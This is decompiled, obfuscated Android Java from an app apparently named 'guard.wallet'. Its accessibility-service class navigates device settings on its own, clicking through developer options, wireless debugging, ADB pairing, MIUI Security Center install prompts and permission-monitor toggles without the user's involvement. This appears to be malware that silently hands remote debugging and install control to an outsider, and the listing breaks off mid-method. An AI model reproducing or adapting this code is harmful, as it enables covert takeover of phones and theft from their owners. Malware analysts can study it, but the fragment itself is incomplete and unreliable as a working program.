package o;

import android.graphics.Rect;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class a0 extends e {
   public final ScheduledExecutorService n;
   public final ConcurrentLinkedQueue o;
   public final AtomicReference p;
   public final ReentrantLock q;
   public final AtomicBoolean r;
   public boolean s;
   public boolean t;
   public boolean u;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public a0() {
      super(E0(), "com.android.settings");
      ScheduledExecutorService var3 = Executors.newSingleThreadScheduledExecutor();
      this.n = var3;
      this.o = new ConcurrentLinkedQueue();
      this.p = new AtomicReference<>(r.g.b);
      this.q = new ReentrantLock();
      this.r = new AtomicBoolean(false);
      this.s = false;
      this.t = false;
      this.u = false;

      Exception var10000;
      label27: {
         long var1;
         label26: {
            label25: {
               try {
                  if (com.guard.wallet.utils.e.m()) {
                     break label25;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label27;
               }

               var1 = 120L;
               break label26;
            }

            var1 = 180L;
         }

         try {
            z var5 = new z(this, 0);
            TimeUnit var4 = TimeUnit.SECONDS;
            var3.schedule(var5, var1, var4);
            var5 = new z(this, 1);
            var3.schedule(var5, 30L, var4);
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var10 = false;
         }
      }

      Exception var8 = var10000;
      a1.q.s("PairAccessibilityDelegate", var8);
   }

   public static ListenWindow A0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_FAILED_4_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_FAILED_4_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.getEventSubscribes().add(C0());
         return var2;
      } else {
         return null;
      }
   }

   public static ListenWindow B0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_FAILED_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_FAILED_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.getEventSubscribes().add(C0());
         return var2;
      } else {
         return null;
      }
   }

   public static EventSubscribe C0() {
      EventSubscribe var0 = new EventSubscribe();
      Integer var1 = 0;
      var0.setListenType(var1);
      var0.setSourceRule(var1);
      var0.setCombineFilter(V());
      var0.setReplyActions(new LinkedList<>());
      TargetActionCondition var2 = new TargetActionCondition();
      var2.setActionType(1);
      var2.setActionName("click");
      var0.getReplyActions().add(var2);
      var0.setEventTypes(new HashSet<>());
      var0.getEventTypes().add(32);
      var0.getEventTypes().add(16384);
      return var0;
   }

   public static LinkedList E0() {
      LinkedList var0 = new LinkedList();
      ListenWindow var3 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
      HashSet var2 = o.b.r(var3);
      Integer var1 = 32;
      var2.add(var1);
      HashSet var4 = var3.getEventTypes();
      Integer var9 = 16384;
      var4.add(var9);
      var0.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var0.add(var3);
      var0.add(I());
      var3 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var0.add(var3);
      var0.add(s0());
      var3 = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var0.add(var3);
      var3 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var0.add(var3);
      var3 = Y0();
      if (var3 != null) {
         var0.add(var3);
      }

      var3 = Z0();
      if (var3 != null) {
         var0.add(var3);
      }

      var3 = new ListenWindow("com.android.systemui", "android.app.Dialog");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var3.getEventTypes().add(1);
      var0.add(var3);
      var3 = new ListenWindow("com.android.settings", null);
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var1);
      var3.getEventTypes().add(var9);
      var0.add(var3);
      ListenWindow var5 = B0();
      if (var5 != null) {
         var0.add(var5);
      }

      ListenWindow var6 = y0();
      if (var6 != null) {
         var0.add(var6);
      }

      ListenWindow var7 = z0();
      if (var7 != null) {
         var0.add(var7);
      }

      ListenWindow var8 = A0();
      if (var8 != null) {
         var0.add(var8);
      }

      var0.add(M0());
      var0.add(I0());
      return var0;
   }

   public static z.d F0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr(new LinkedList<>());
      boolean var0 = a1.q.B(com.guard.wallet.utils.f.b("PAIR_DISABLE_PERMISSION_MONITOR_TEXT"));
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var4 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DISABLE_PERMISSION_MONITOR_TEXT", var4, var1, var4);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = (CombineFilter)var2;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT"))) {
         var1 = new CombineFilter();
         var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT", (StringCondition)var2, var1, (StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return new z.d(var3, 2, 1);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void H(a0 var0) {
      var0.getClass();

      Exception var10000;
      label158: {
         boolean var3;
         try {
            var3 = var0.L();
         } catch (Exception var19) {
            var10000 = var19;
            boolean var10001 = false;
            break label158;
         }

         ConcurrentLinkedQueue var4;
         label160: {
            boolean var1;
            var4 = var0.o;
            boolean var2 = false;
            var1 = var2;
            label131:
            if (var3) {
               UiObject var5;
               try {
                  Log.d("PairAccessibilityDelegate", "pairInDevOption 窗口匹配");
                  com.guard.wallet.helper.g.h(10);
                  var0.G();
                  Log.d("PairAccessibilityDelegate", "active root complete");
                  var5 = var0.f0();
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var25 = false;
                  break label158;
               }

               String var20;
               if (var5 != null) {
                  try {
                     Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                     if (com.guard.wallet.utils.e.l() && !com.guard.wallet.utils.g.K() && var0.T0(var5)) {
                        break label160;
                     }
                  } catch (Exception var18) {
                     var10000 = var18;
                     boolean var26 = false;
                     break label158;
                  }

                  try {
                     var5 = var0.G0(var5);
                  } catch (Exception var12) {
                     var10000 = var12;
                     boolean var27 = false;
                     break label158;
                  }

                  if (var5 != null) {
                     UiObject var24;
                     try {
                        StringBuilder var6 = new StringBuilder("无线调试栏目查找成功:");
                        var6.append(var5.toString());
                        Log.d("PairAccessibilityDelegate", var6.toString());
                        var24 = var5.findParentUtilCombine(T());
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var28 = false;
                        break label158;
                     }

                     if (var24 != null) {
                        label156: {
                           try {
                              Log.d("PairAccessibilityDelegate", "无线调试可点击栏目查找成功");
                              com.guard.wallet.helper.g.h(15);
                              if (!a1.q.B(var5.text())
                                 && var5.text().contains(com.guard.wallet.utils.f.b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"))
                                 && S(var24)) {
                                 Log.d("PairAccessibilityDelegate", "依禁用ADB节点位置进入无线调试栏目");
                                 com.guard.wallet.helper.g.h(25);
                                 break label156;
                              }
                           } catch (Exception var17) {
                              var10000 = var17;
                              boolean var29 = false;
                              break label158;
                           }

                           label110: {
                              label109: {
                                 label108: {
                                    try {
                                       if (com.guard.wallet.utils.e.m()) {
                                          if (VERSION.SDK_INT > 30) {
                                             break label109;
                                          }
                                          break label108;
                                       }
                                    } catch (Exception var16) {
                                       var10000 = var16;
                                       boolean var30 = false;
                                       break label158;
                                    }

                                    try {
                                       if (com.guard.wallet.utils.e.g()) {
                                          break label109;
                                       }
                                    } catch (Exception var15) {
                                       var10000 = var15;
                                       boolean var31 = false;
                                       break label158;
                                    }
                                 }

                                 var1 = true;
                                 break label110;
                              }

                              var1 = false;
                           }

                           if (var1) {
                              try {
                                 if (R(var24)) {
                                    Log.d("PairAccessibilityDelegate", "无线调试已勾选");
                                    com.guard.wallet.helper.g.h(20);
                                 }
                              } catch (Exception var10) {
                                 var10000 = var10;
                                 boolean var32 = false;
                                 break label158;
                              }
                           }

                           label157: {
                              try {
                                 if (var24.click()) {
                                    var0.p.set(r.g.c);
                                    Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目");
                                    com.guard.wallet.helper.g.h(25);
                                    break label157;
                                 }
                              } catch (Exception var14) {
                                 var10000 = var14;
                                 boolean var33 = false;
                                 break label158;
                              }

                              try {
                                 Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目失败");
                              } catch (Exception var9) {
                                 var10000 = var9;
                                 boolean var34 = false;
                                 break label158;
                              }

                              var1 = var2;
                              break label131;
                           }

                           var1 = true;
                           break label131;
                        }

                        var1 = var2;
                        break label131;
                     }

                     var20 = "无线调试可点击栏目查找失败";
                  } else {
                     var20 = "无线调试栏目查找失败";
                  }
               } else {
                  var20 = "开发者选项窗口滚动视图查找失败,重置开发者选项窗口";
               }

               try {
                  Log.e("PairAccessibilityDelegate", var20);
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var35 = false;
                  break label158;
               }

               var1 = var2;
            }

            if (var1) {
               return;
            }
         }

         try {
            var4.remove("pairInDevOption");
            return;
         } catch (Exception var7) {
            var10000 = var7;
            boolean var36 = false;
         }
      }

      Exception var21 = var10000;
      a1.q.s("PairAccessibilityDelegate", var21);
   }

   public static CombineFiltersWithOr H0() {
      CombineFiltersWithOr var0 = new CombineFiltersWithOr();
      var0.setFilters(new LinkedList<>());
      List var2 = var0.getFilters();
      CombineFilter var1 = new CombineFilter();
      var1.setStringConditions(new LinkedList<>());
      var1.setBoolConditions(new LinkedList<>());
      StringCondition var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("androidx.recyclerview.widget.RecyclerView");
      var1.getStringConditions().add(var3);
      BoolCondition var10 = new BoolCondition("scrollable", true, true);
      var1.getBoolConditions().add(var10);
      var2.add(var1);
      List var4 = var0.getFilters();
      CombineFilter var7 = new CombineFilter();
      var7.setStringConditions(new LinkedList<>());
      var7.setBoolConditions(new LinkedList<>());
      var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("android.widget.ListView");
      var7.getStringConditions().add(var3);
      BoolCondition var12 = new BoolCondition("scrollable", true, true);
      var7.getBoolConditions().add(var12);
      var4.add(var7);
      List var5 = var0.getFilters();
      CombineFilter var8 = new CombineFilter();
      var8.setStringConditions(new LinkedList<>());
      var8.setBoolConditions(new LinkedList<>());
      var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("android.widget.ScrollView");
      var8.getStringConditions().add(var3);
      BoolCondition var14 = new BoolCondition("scrollable", true, true);
      var8.getBoolConditions().add(var14);
      var5.add(var8);
      List var6 = var0.getFilters();
      CombineFilter var9 = new CombineFilter();
      var9.setStringConditions(new LinkedList<>());
      var9.setBoolConditions(new LinkedList<>());
      BoolCondition var15 = new BoolCondition("scrollable", true, true);
      var9.getBoolConditions().add(var15);
      var6.add(var9);
      return var0;
   }

   public static ListenWindow I() {
      ListenWindow var0 = new ListenWindow("com.android.settings", null);
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      List var3 = var0.getMatchs();
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      var2.setContains(com.guard.wallet.utils.f.b("PAIR_ALLOW_DEVELOPER_SETTING_TEXT"));
      var1.getStringConditions().add(var2);
      var3.add(var1);
      return var0;
   }

   public static ListenWindow I0() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
      var0.setMatchs(new LinkedList<>());
      var0.getMatchs().add(L0());
      var0.setEventTypes(new HashSet<>());
      o.b.q(16384, o.b.q(32, var0.getEventTypes(), var0), var0).add(2048);
      return var0;
   }

   public static ListenWindow J() {
      ListenWindow var0 = new ListenWindow("com.android.systemui", "android.app.Dialog");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(1);
      return var0;
   }

   public static CombineFilter J0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.Button"), "text");
      o.b.v("PAIR_ACCEPT_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter K0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Button"), "text");
      o.b.v("PAIR_NEXT_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter L0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      var1.setContains(com.guard.wallet.utils.f.b("PAIR_SECURITY_OPENING_TEXT"));
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static ListenWindow M0() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.install.AdbInputApplyActivity");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public static ListenWindow O0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(X());
      return var0;
   }

   public static ListenWindow P0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(Z());
      return var0;
   }

   public static CombineFilter Q0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = a.a.c(var1, "className", "android.widget.Switch");
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static boolean R(UiObject var0) {
      AtomicInteger var3 = new AtomicInteger(0);
      boolean var1 = com.guard.wallet.utils.g.J();

      while (!var1) {
         boolean var2;
         try {
            if (var3.incrementAndGet() > 10) {
               break;
            }

            CheckedResult var4 = h0(var0);
            if (var4.isClicked()) {
               Log.d("PairAccessibilityDelegate", "无线调试勾选框已点击");
               com.guard.wallet.utils.g.T0(10);
            }

            if (var4.isChecked()) {
               Log.d("PairAccessibilityDelegate", "已勾选无线调试");
            }

            var2 = com.guard.wallet.utils.g.J();
         } catch (Exception var5) {
            a1.q.s("PairAccessibilityDelegate", var5);
            break;
         }

         var1 = var2;
      }

      return var1;
   }

   public static CombineFilter R0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      var0.setContains(com.guard.wallet.utils.f.b("PAIR_ALLOW_USB_INSTALL_TEXT"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static boolean S(UiObject var0) {
      try {
         Log.d("PairAccessibilityDelegate", "禁用ADB调试栏目查找成功");
         int var1 = var0.boundsInScreen().left;
         int var2 = var0.boundsInScreen().top;
         int var4 = var0.boundsInScreen().right;
         int var3 = var0.boundsInScreen().top;
         Rect var6 = new Rect(var1, var2 - 200, var4, var3);
         if (com.guard.wallet.utils.g.s(var6.centerX(), var6.centerY())) {
            Log.d("PairAccessibilityDelegate", "根据屏幕左边点击无线调试栏目完成");
            com.guard.wallet.helper.g.h(20);
            return true;
         }
      } catch (Exception var5) {
         a1.q.s("PairAccessibilityDelegate", var5);
      }

      return false;
   }

   public static CombineFilter S0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("PAIR_USB_SECURITY_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter T() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      BoolCondition var1 = new BoolCondition("clickable", true, true);
      var0.getBoolConditions().add(var1);
      return var0;
   }

   public static CombineFilter U() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = a.a.b(var1, a.a.c(var1, "className", "android.widget.Button"), "id", "android:id/button1");
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static ListenWindow U0() {
      CombineFilter var0 = V0();
      if (var0 != null) {
         ListenWindow var1 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(var0);
         var1.setEventTypes(new HashSet<>());
         o.b.q(32, var1.getEventTypes(), var1).add(16384);
         return var1;
      } else {
         return null;
      }
   }

   public static CombineFilter V() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.Button"), "text");
      var1.setContains(com.guard.wallet.utils.f.b("PAIR_CONFIRM_TEXT"));
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static CombineFilter V0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_WIFI_DEBUG_2_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_WIFI_DEBUG_2_TEXT", var1, var0, var1);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow W() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow W0() {
      CombineFilter var1 = X0();
      if (var1 != null) {
         ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
         var0.setMatchs(new LinkedList<>());
         var0.getMatchs().add(var1);
         var0.setEventTypes(new HashSet<>());
         o.b.q(32, var0.getEventTypes(), var0).add(16384);
         return var0;
      } else {
         return null;
      }
   }

   public static CombineFilter X() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPERS_OPTION_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPERS_OPTION_TEXT", var0, var1, var0);
         return var1;
      } else {
         return null;
      }
   }

   public static CombineFilter X0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_WIFI_DEBUG_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_WIFI_DEBUG_TEXT", var1, var0, var1);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow Y() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow Y0() {
      CombineFilter var1 = u0();
      if (var1 != null) {
         ListenWindow var0 = new ListenWindow(null, null);
         var0.setMatchs(new LinkedList<>());
         var0.getMatchs().add(var1);
         var0.setEventTypes(new HashSet<>());
         o.b.q(32, var0.getEventTypes(), var0).add(16384);
         return var0;
      } else {
         return null;
      }
   }

   public static CombineFilter Z() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPER_OPTION_TEXT", var1, var0, var1);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow Z0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"))) {
         var0 = new CombineFilter();
         var0.setStringConditions(new LinkedList<>());
         StringCondition var1 = new StringCondition();
         var1.setProperty("text");
         var1.setContains(com.guard.wallet.utils.f.b("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"));
         var0.getStringConditions().add(var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow(null, null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.setEventTypes(new HashSet<>());
         o.b.q(32, var2.getEventTypes(), var2).add(16384);
         return var2;
      } else {
         return null;
      }
   }

   public static CombineFiltersWithOr a0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      boolean var0 = a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_TEXT"));
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var4 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPER_OPTION_TEXT", var4, var1, var4);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPERS_OPTION_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var11 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPERS_OPTION_TEXT", var11, var1, var11);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_2_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var12 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPER_OPTION_2_TEXT", var12, var1, var12);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var13 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPER_OPTION_3_TEXT", var13, var1, var13);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var14 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPER_OPTION_4_TEXT", var14, var1, var14);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = (CombineFilter)var2;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
         var1 = new CombineFilter();
         var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Switch"), "desc");
         o.b.v("PAIR_DEVELOPER_OPTION_5_TEXT", (StringCondition)var2, var1, (StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   public static CombineFiltersWithOr b0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      CombineFilter var1 = Z();
      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = X();
      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      boolean var0 = a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_2_TEXT"));
      Object var2 = null;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var4 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPER_OPTION_2_TEXT", var4, var1, var4);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var11 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPER_OPTION_3_TEXT", var11, var1, var11);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var12 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPER_OPTION_4_TEXT", var12, var1, var12);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = (CombineFilter)var2;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
         var1 = new CombineFilter();
         var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVELOPER_OPTION_5_TEXT", (StringCondition)var2, var1, (StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   public static CombineFilter c0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   public static CombineFilter d0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static CheckedResult e0(UiObject var0) {
      boolean var3 = false;
      boolean var1 = false;
      AtomicInteger var6 = new AtomicInteger(0);
      CheckedResult var5 = new CheckedResult();
      boolean var2 = var1;

      label215: {
         Exception var10000;
         label219: {
            UiObject var4;
            label213: {
               label212: {
                  try {
                     if (var0.checkable()) {
                        break label212;
                     }
                  } catch (Exception var33) {
                     var10000 = var33;
                     boolean var10001 = false;
                     break label219;
                  }

                  var4 = null;
                  break label213;
               }

               var4 = var0;
            }

            var2 = var1;

            CombineFilter var7;
            try {
               var7 = new CombineFilter();
            } catch (Exception var32) {
               var10000 = var32;
               boolean var37 = false;
               break label219;
            }

            var2 = var1;

            try {
               // [VF-FIX] var7./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var31) {
               var10000 = var31;
               boolean var38 = false;
               break label219;
            }

            var2 = var1;

            LinkedList var8;
            try {
               var8 = new LinkedList();
            } catch (Exception var30) {
               var10000 = var30;
               boolean var39 = false;
               break label219;
            }

            var2 = var1;

            try {
               // [VF-FIX] var8./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var29) {
               var10000 = var29;
               boolean var40 = false;
               break label219;
            }

            var2 = var1;

            try {
               var7.setBoolConditions(var8);
            } catch (Exception var28) {
               var10000 = var28;
               boolean var41 = false;
               break label219;
            }

            var2 = var1;

            List var9;
            try {
               var9 = var7.getBoolConditions();
            } catch (Exception var27) {
               var10000 = var27;
               boolean var42 = false;
               break label219;
            }

            var2 = var1;

            try {
               var36 = new BoolCondition("checkable", true, true);
            } catch (Exception var26) {
               var10000 = var26;
               boolean var43 = false;
               break label219;
            }

            var2 = var1;

            try {
               // [VF-FIX] var36./* $VF: Unable to resugar constructor */<init>("checkable", true, true);
            } catch (Exception var25) {
